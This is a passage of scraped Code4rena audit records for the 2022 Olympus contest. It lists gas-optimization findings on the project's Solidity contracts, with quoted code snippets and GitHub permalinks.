[37](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L37) Governance.sol: [145](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L145) [151](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L151)  &nbsp;  **Pre-compute `.length` before repeated usage, especially in loops**  Instances: [Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278)  &nbsp;  **`observations.length` is already computed in `numObservations`** `uint256 numObs = observations.length;`can be changed into `uint256 numObs = numObservations;` as suggested by its preceding comment, because its length is already calculated during construction. [PRICE.sol#L212](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L212)   "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/471", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Table of contents  - **[[0x0] Disclaimer](#0x0)** - **[[G-01] Try ++i instead of i++](G-01)** - **[[G-02] Consider `a = a + b` instead of `a += b`](G-02)** - **[[G-03] Consider marking onlyOwner functions as payable](G-03)** - **[[G-04] Use binary shifting instead of `a / 2^x, x > 0`](G-04)** - **[[G-05] Cache state variables, `MLOAD` << `SLOAD`](G-05)** - **[[G-06] Add `require()` before some computations, if it makes sense](G-06)** - **[[G-07] `Internal` functions can be inlined](G-07)** - **[[G-08] Use `private/internal` for `constants/immutable` variables instead of `public`](G-08)** - **[[G-09] Use const values instead of `type(uint256).max`](G-09)** - **[[G-10] Mark functions as `external` instead of `public`, if there are no internal calls](G-10)** - **[[G-11] Use `calldataload` instead of `mload`](G-11)** - **[[G-12] Define state variables as `immutable/const`](G-12)   ## Disclaimer<a name=\"0x0\"></a>  - Please, consider everything described below as a general recommendation. These notes will represent potential possibilities to optimize gas consumption. It's okay, if something is not suitable in your case. Just let me know the reason in the comments section. Enjoy!  ## **[G-01] Try ++i instead of i++**<a name=\"G-01\"></a>  ### ***Description:***    - In case of `i++`, the compiler has to to create a temp variable to return `i` (if there's a need) and then `i` gets incremented.     - In case of `++i`, the compiler just simply returns already incremented value.  ### ***All occurances:***    - Contracts:        ```Solidity       file: src/utils/KernelUtils.sol       ...............................                // Lines: [63-63]           unchecked {               i++;           }          // Lines: [58-60]           unchecked {               i++;           }     ```  ## **[G-02] Consider `a = a + b` instead of `a += b`**<a name=\"G-02\"></a>  ### ***Description:***  - It has an impact on the deployment cost and the cost for distinct transaction as well.  ### ***All occurances:***  - Contracts:        ```Solidity       file: src/modules/PRICE.sol        ...............................                // Lines: [136-136]             _movingAverage += (currentPrice - earliestPrice) / numObs;          // Lines: [138-138]             _movingAverage -= (earliestPrice - currentPrice) / numObs;           // Lines: [222-222]             total += startObservations_[i];        file: src/modules/TRSRY.sol        ...............................          // Lines: [96-97]             reserveDebt[token_][msg.sender] += amount_;             totalDebt[token_] += amount_;          // Lines: [131-131]             if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;          // Lines: [115-116]             reserveDebt[token_][msg.sender] -= received;             totalDebt[token_] -= received;          // Lines: [132-132]             else totalDebt[token_] -= oldDebt - amount_;        file: src/modules/VOTES.sol        ...............................          // Lines: [58-58]             balanceOf[to_] += amount_;          // Lines: [56-56]             balanceOf[from_] -= amount_;        file: src/policies/BondCallback.sol        ...............................          // Lines: [143-144]             _amountsPerMarket[id_][0] += inputAmount_;             _amountsPerMarket[id_][1] += outputAmount_;        file: src/policies/Governance.sol        ...............................          // Lines: [194-194]             totalEndorsementsForProposal[proposalId_] -= previousEndorsement;          // Lines: [198-198]             totalEndorsementsForProposal[proposalId_] += userVotes;          // Lines: [251-255]             if (for_) {                 yesVotesForProposal[activeProposal.proposalId] += userVotes;             } else {                 noVotesForProposal[activeProposal.proposalId] += userVotes;             }        file:  src/policies/Heart.sol       ...............................          // Lines: [103-103]             lastBeat += frequency();          // Lines: [138-138]         // Lines: [138-138]      ```  ## **[G-03] Consider marking onlyOwner functions as payable**<a name=\"G-03\"></a>  ### ***Description:***  - This one is a bit questionable, but you can try that out. So, the compiler adds some extra conditions in case of non-payable, but we know that `onlyOwner` modifier will be reverted, if the user invoke following methods.  ### ***All occurances:***  - Contracts:        ```Solidity       file:  src/Kernel.sol       ...............................                // Lines: [76-78]             function changeKernel(Kernel newKernel_) external onlyKernel {                 kernel = newKernel_;             }          // Lines: [126-128]             function setActiveStatus(bool activate_) external onlyKernel {                 isActive = activate_;             }          // Lines: [439-448]             function grantRole(Role role_, address addr_) public onlyAdmin {}          // Lines: [451-460]             function revokeRole(Role role_, address addr_) public onlyAdmin {}          // Lines: [235-260]             function revokeRole(Role role_, address addr_) public onlyAdmin {}        file: src/policies/BondCallback.sol        ...............................          // Lines: [61-76]             function requestPermissions()                 external                 view                 override                 onlyKernel                 returns (Permissions[] memory requests)             {}        file: src/policies/Governance.sol        ...............................          // Lines: [61-76]             function requestPermissions()                 external                 view                 override                 onlyKernel                 returns (Permissions[] memory requests)             {}         ```  ## **[G-04] Use binary shifting instead of `a / 2^x, x > 0` or `a * 2^x, x > 0`**<a name=\"G-04\"></a>  ### ***Description:***  - It's also pretty impactful one, especially in loops.  ### ***All occurances:***  - Contracts:        ```Solidity       file:  src/policies/Operator.sol       ...............................                // Lines: [372-372]           int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);          // Lines: [427-427]           int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);          // Lines: [419-420]           uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;           uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;        ```  ## **[G-05] Cache state variables, `MLOAD` << `SLOAD`**<a name=\"G-05\"></a>  ### ***Description:***  - `MLOAD` costs only 3 units of gas, `SLOAD`(warm access) is about 100 units. Therefore, cache, when it's possible.  ### ***All occurances:***  - Contracts:        ```Solidity       file: src/policies/Governance.sol        ...............................          // Lines: [240-262]           // Comment: it is possible to cache `activeProposal.proposalId` in order to get MLOAD instead of warm access per each invoking.                    function vote(bool for_) external {                   uint256 userVotes = VOTES.balanceOf(msg.sender);                    if (activeProposal.proposalId == 0) {                       revert NoActiveProposalDetected();                   }                    if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {                       revert UserAlreadyVoted();                   }                    if (for_) {                       yesVotesForProposal[activeProposal.proposalId] += userVotes;                   } else {                       noVotesForProposal[activeProposal.proposalId] += userVotes;                   }                    userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;                    VOTES.transferFrom(msg.sender, address(this), userVotes);                    emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);               }          // Lines: [265-289]           // Comment: it is possible to cache `activeProposal.proposalId` in order to get MLOAD instead of warm access per each invoking.                  function executeProposal() external {                   uint256 netVotes = yesVotesForProposal[activeProposal.proposalId] -                       noVotesForProposal[activeProposal.proposalId];                   if (netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD) {                       revert NotEnoughVotesToExecute();                   }                    if (block.timestamp < activeProposal.activationTimestamp + EXECUTION_TIMELOCK) {                       revert ExecutionTimelockStillActive();                   }                    Instruction[] memory instructions = INSTR.getInstructions(activeProposal.proposalId);                    for (uint256 step; step < instructions.length; ) {                       kernel.executeAction(instructions[step].action, instructions[step].target);                       unchecked {                           ++step;                       }                   }                    emit ProposalExecuted(activeProposal.proposalId);                    // deactivate the active proposal                   activeProposal = ActivatedProposal(0, 0);               }        file:  src/modules/RANGE.sol       ...............................          // Lines: [158-178]           // Comment: here you can allocate the result of `_range.wall.low.price` computation and etc into the memory, so in event you can simply pass that precomputed value instead of taking warm access to get `_range.wal.low.price again`. The same for all computation could be done.                function updatePrices(uint256 movingAverage_) external permissioned {                   // Cache the spreads                   uint256 wallSpread = _range.wall.spread;                   uint256 cushionSpread = _range.cushion.spread;                    // Calculate new wall and cushion values from moving average and spread                   _range.wall.low.price = (movingAverage_ * (FACTOR_SCALE - wallSpread)) / FACTOR_SCALE;                   _range.wall.high.price = (movingAverage_ * (FACTOR_SCALE + wallSpread)) / FACTOR_SCALE;                    _range.cushion.low.price = (movingAverage_ * (FACTOR_SCALE - cushionSpread)) / FACTOR_SCALE;                   _range.cushion.high.price =                       (movingAverage_ * (FACTOR_SCALE + cushionSpread)) /                       FACTOR_SCALE;                    emit PricesChanged(                       _range.wall.low.price,                       _range.cushion.low.price,                       _range.cushion.high.price,                       _range.wall.high.price                   );               }        file: src/modules/PRICE.sol        ...............................          // Lines: [97-100]           // Comment: Also cache computation into memory, then assign the numObservations and after that just pass this cached result into allocating array.               numObservations = uint32(movingAverageDuration_ / observationFrequency_);             observations = new uint256[](numObservations);          // Lines: [144-144]           // This line could be transformed a bit:             nextObsIndex = (nextObsIndex + 1) % numObs;              ++nextObsIndex %= numObs;           // Lines: [165-171]           // Comment: cache `observationFrequency`               if (updatedAt < block.timestamp - 3 * uint256(observationFrequency))                   revert Price_BadFeed(address(_ohmEthPriceFeed));               ohmEthPrice = uint256(ohmEthPriceInt);                int256 reserveEthPriceInt;               (, reserveEthPriceInt, , updatedAt, ) = _reserveEthPriceFeed.latestRoundData();               if (updatedAt < block.timestamp - uint256(observationFrequency))          // Lines: [240-262]          ```  ## **[G-06] Add `require() before some computations, if it makes sense`**<a name=\"G-06\"></a>   ### ***Description:***  - Everyting above `require()` takes some gas for execution, therefore if the statement reverts gas will not be retrieved.  ### ***All occurances:***  - Contracts:        ```Solidity       file: src/modules/INSTR.sol        ...............................                // Lines: [48-48]           // Comment: Put right after getting length in order to avoid unnecessary cold/warm accesses in case of the failure.               if (length == 0) revert INSTR_InstructionsCannotBeEmpty();        file: src/policies/Governance.sol        ...............................         // Lines: [183-185]                if (proposalId_ == 0) {                   revert CannotEndorseNullProposal();               }      ```    ## **[G-07] `Internal` functions can be inlined**<a name=\"G-07\"></a>  ### ***Description:***  - It takes some extra `JUMP`s which costs around 40-50 gas uints. In loops it will save significant amount of gas.  ### ***All occurances:***  - Contracts:        ```Solidity       file:  src/policies/Operator.sol       ...............................                // Lines: [643-643]           function _updateRangePrices() internal {}          // Lines: [634-634]             function _updateCapacity(bool high_, uint256 reduceBy_) internal {}      ```    ## **[G-08] Use `private/internal` for `constants/immutable` variables instead of `public`**<a name=\"G-08\"></a>  ### ***Description:***  - Optimization comes from not creating a getter function for each `public` instance. Try to define them as private/internal if it's possible in specific case.    ### ***All occurances:***  - Contracts:        ```Solidity       file:  src/Kernel.sol       ...............................               // Lines: [155-158]             address public executor;             address public admin;          // Lines: [165-197]             Keycode[] public allKeycodes;             mapping(Keycode => Module) public getModuleForKeycode;             mapping(Module => Keycode) public getKeycodeForModule;             mapping(Keycode => Policy[]) public moduleDependents;             mapping(Keycode => mapping(Policy => uint256)) public getDependentIndex;             mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions;             Policy[] public activePolicies;             mapping(Policy => uint256) public getPolicyIndex;             mapping(address => mapping(Role => bool)) public hasRole;             mapping(Role => bool) public isRole;        // Comment: I'll not include every single occurance, because the main message have been proposed.      ```    ## **[G-09] Use const values instead of `type(uint256).max`**<a name=\"G-09\"></a>  ### ***Description:***  - Not sure about readability, but it might be tangible in loops.    ### ***All occurances:***  - Contracts:        ```Solidity       file:  src/modules/RANGE.sol       ...............................                // Lines: [88-88]           market: type(uint256).max          // Lines: [95-95]           market: type(uint256).max           // Lines: [221-221]           if (market_ == type(uint256).max && marketCapacity_ != 0) revert RANGE_InvalidParams();          // Lines: [230-230]           if (market_ == type(uint256).max) {}        file: src/modules/TRSRY.sol        ...............................          // Lines: [147-151]             if (approval != type(uint256).max) {                 unchecked {                     withdrawApproval[withdrawer_][token_] = approval - amount_;                 }             }        file: src/policies/BondCallback.sol        ...............................          // Lines: [57-57]             ohm.safeApprove(address(MINTR), type(uint256).max);          // Lines: [95-95]             TRSRY.setApprovalFor(address(this), payoutToken, type(uint256).max);        file:  src/policies/Operator.sol       ...............................          // Lines: [167-167]             ohm.safeApprove(address(MINTR), type(uint256).max);          // Lines: [477-477]             RANGE.updateMarket(high_, type(uint256).max, 0);          // Lines: [603-603]             TRSRY.setApprovalFor(address(this), reserve, type(uint256).max);      ```  ## **[G-10] Mark functions as `external` instead of `public`, if there are no internal calls**<a name=\"G-10\"></a>  ### ***Description:***  - Functions marked by `external` use call data to read arguments, where `public` will first allocate in local memory and then load them.    ### ***All occurances:***  - Contracts:        ```Solidity       file: src/modules/INSTR.sol        ...............................          // Lines: [28-30]           function VERSION() public pure override returns (uint8 major, uint8 minor) {               return (1, 0);           }          // Lines: [37-39]           function getInstructions(uint256 instructionsId_) public view returns (Instruction[] memory) {               return storedInstructions[instructionsId_];           }         file: src/modules/MINTR.sol        ...............................          // Lines: [20-22]             function KEYCODE() public pure override returns (Keycode) {                 return toKeycode(\"MINTR\");             }          // Lines: [33-39]             function mintOhm(address to_, uint256 amount_) public permissioned {                 ohm.mint(to_, amount_);             }              function burnOhm(address from_, uint256 amount_) public permissioned {                 ohm.burnFrom(from_, amount_);             }         ``` ## **[G-11] Use `calldataload` instead of `mload`**<a name=\"G-11\"></a>  ### ***Description:***  - After Berlin hard fork, to load a non-zero byte from calldata dropped from 64 units of gas to 16 units, therefore if you do not modify args, use a calldata instead of memory. Here you need to explicitly specify `calldataload`, or replace `memory` with `calldata`. If the args are pretty huge, allocating args in memory will cost a lot.     ### ***All occurances:***  - Contracts:        ```Solidity       file: src/Kernel.sol        ...............................                // Lines: [391-395]           // Comment: Permissions[] calldata requests_ instead of allocating into the memory.              function _setPolicyPermissions(                 Policy policy_,                 Permissions[] memory requests_,                 bool grant_             ) internal {}        file: src/modules/PRICE.sol        ...............................          // Lines: [205-205]             function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_){}        file:  src/modules/RANGE.sol       ...............................          // Lines: [77-81]             constructor(                 Kernel kernel_,                 ERC20[2] memory tokens_,                 uint256[3] memory rangeParams_ // [thresholdFactor, cushionSpread, wallSpread]             ) Module(kernel_) {}          // Lines: [275-277]           // Comment: Calldata return             function range() external view returns (Range memory) {                 return _range;             }        file: src/policies/BondCallback.sol        ...............................          // Lines: [152-152]             function batchToTreasury(ERC20[] memory tokens_) external onlyRole(\"callback_admin\") {}        file: src/policies/Governance.sol        ...............................          // Lines: [159-163]             function submitProposal(                 Instruction[] calldata instructions_,                 bytes32 title_,                 string memory proposalURI_             ) external {}        file:  src/policies/Operator.sol       ...............................          // Lines: [92-98]             constructor(                 Kernel kernel_,                 IBondAuctioneer auctioneer_,                 IBondCallback callback_,                 ERC20[2] memory tokens_, // [ohm, reserve]    "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/462", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": " # GAS ## Comparision with a boolean ### Summary There are a number of instances where a boolean variable/function is checked. This check can be further simplified from `variable == true` to `!variable`.  ### Github Permalink https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L205-L236 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L295-L313 ### Mitigation Simplify boolean comparisons in order to improve readility and save gas  ## Public function visibility can be made external ### Summary  Functions should have the strictest visibility possible. Public functions may lead to more gas usage by forcing the copy of their parameters to memory from calldata. ### Details  If a function is never called from the contract it should be marked as external. This will save gas. ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L215-L235 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/MINTR.sol#L33-L35 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/MINTR.sol#L37-L39 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L28-L30 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L145-L147 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L151-L153 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L37-L39 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L75-L85 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L451-L458 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L439-L448  ### Mitigation  Consider changing visibility from public to external.  ## Caching calculation result can save gas ### Summary Reading from state is an expensive operation, it should be avoided when able to. ### Details In this context, value is already known as it is calculated in the same function, but in the emit what is emitted is not the local calculation but the state variable that stores result. ```         // Calculate new moving average         if (currentPrice > earliestPrice) {             _movingAverage += (currentPrice - earliestPrice) / numObs;         } else {             _movingAverage -= (earliestPrice - currentPrice) / numObs;         }         //@audit _movingAverage can be calculated to a local variable and then assigned to state so the local variable is read rather than the state in the emit          // Push new observation into storage and store timestamp taken at         observations[nextObsIndex] = currentPrice;         lastObservationTime = uint48(block.timestamp);         nextObsIndex = (nextObsIndex + 1) % numObs;                   emit NewObservation(block.timestamp, currentPrice, _movingAverage);     } ``` ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L134-L147  Same scenario here with all 4 variables in the emit https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L164-L177  ### Mitigation Consider a local variable for avoiding unnecessary reads.  ## Variables should be cached when used several times ### Summary Variables read more than once improves gas usage when cached into local variable ### Details In loops or state variables, this is even more gas saving  ### Github Permalinks activeProposal.proposalId https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L242-L262 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L266-L285  reward https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Heart.sol#L112-L113  ### Mitigation Cache variables used more than one into a local variable.    ## usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead ### Summary When using elements that are smaller than 32 bytes, your contract\u2019s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.  ### Details https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html  Use a larger size than downcast where needed  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L44-L59 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L83 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L86 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L89 ### Mitigation Consider using some data type that uses 32 bytes, for example uint256  ## Using bools for storage incurs overhead {  ### Summary Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.  ### Details Here is one example of OpenZeppelin about this optimization https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27  Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from \u2018false\u2019 to \u2018true\u2019, after having been \u2018true\u2019 in the past  ### Github Permalinks - variables https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L113 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L207 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L394 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L62 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L216 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Heart.sol#L33 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L63 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L66 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L735 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/interfaces/IBondAuctioneer.sol#L48  - functions/events https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/interfaces/IBondAuctioneer.sol#L128 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/interfaces/IBondAuctioneer.sol#L121 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/interfaces/IBondAggregator.sol#L74 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/interfaces/IOperator.sol#L143 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/interfaces/IOperator.sol#L131 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L778 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L732 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L699 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L634 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L618 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L473 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L363 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L240 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L89 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L340 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L330 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L320 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L302 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L291 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L281 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L184 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L23 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L22 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L21 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L20 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L126 ### Mitigation Consider using uint256 with values 0 and 1 rather than bool    ## Pack structs tightly ### Summary Gas efficiency can be achieved by tightly packing the struct. Struct variables are stored in 32 bytes each so you can group smaller types to occupy less storage.   ### Details You can read more here: https://fravoll.github.io/solidity-patterns/tight_variable_packing.html or in the official documentation: https://docs.soliditylang.org/en/v0.4.21/miscellaneous.html ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/interfaces/IOperator.sol#L30-L35  ### Mitigation Order structs to reduce gas usage.  ## Store using Struct over multiple mappings ### Summary All these variables could be combine in a Struct in order to reduce the gas cost.  ### Details As noticed in:  https://gist.github.com/alexon1234/b101e3ac51bea3cbd9cf06f80eaa5bc2 When multiple mappings that access the same addresses, uints, etc, all of them can be mixed into an struct and then that data accessed like: mapping(datatype => newStructCreated) newStructMap; Also, you have this post where it explains the benefits of using Structs over mappings  https://medium.com/@novablitz/storing-structs-is-costing-you-gas-774da988895e  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L168 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L174-L181 - - -  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/external/OlympusERC20.sol#L666-L669 - - - https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L35-L39 - - - https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L95-L117  ### Mitigation Consider mixing different mappings into an struct when able in order to save gas.   ## Using private rather than public for constants saves gas ### Summary If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/PRICE.sol#L59     `uint8 public constant decimals = 18;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L65     `uint256 public constant FACTOR_SCALE = 1e4;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L121     `uint256 public constant SUBMISSION_REQUIREMENT = 100;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L124     `uint256 public constant ACTIVATION_DEADLINE = 2 weeks;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L127     `uint256 public constant GRACE_PERIOD = 1 weeks;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L130     `uint256 public constant ENDORSEMENT_THRESHOLD = 20;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L133     `uint256 public constant EXECUTION_THRESHOLD = 33;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L137     `uint256 public constant EXECUTION_TIMELOCK = 3 days;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L89     `uint32 public constant FACTOR_SCALE = 1e4;`  ### Mitigation Consider replacing public for private in constants for gas saving.   ## Index initialized in for loop ### Summary In for loops is not needed to initialize indexes to 0 as it is the default uint/int value. This saves gas.  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L397 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/utils/KernelUtils.sol#L43 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/utils/KernelUtils.sol#L58   ### Mitigation Don't initialize variables to default value   ## ++i costs less gas compared to i++, the same happens with --i and i--  ### Summary ++i costs less gas compared to i++ or i += 1 for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration).  This statement is true even with the optimizer enabled.   ### Details i++ increments i and returns the initial value of i .  Which means: uint i = 1; 